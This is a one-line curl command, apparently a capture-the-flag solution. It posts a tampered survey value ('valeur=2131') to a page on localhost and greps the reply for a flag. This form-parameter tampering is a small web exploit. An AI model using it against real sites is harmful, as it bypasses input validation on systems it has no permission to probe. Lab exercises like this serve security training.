curl -X POST "http://localhost:8080/?page=survey" \
-d "sujet=2&valeur=2131" | grep "flag"
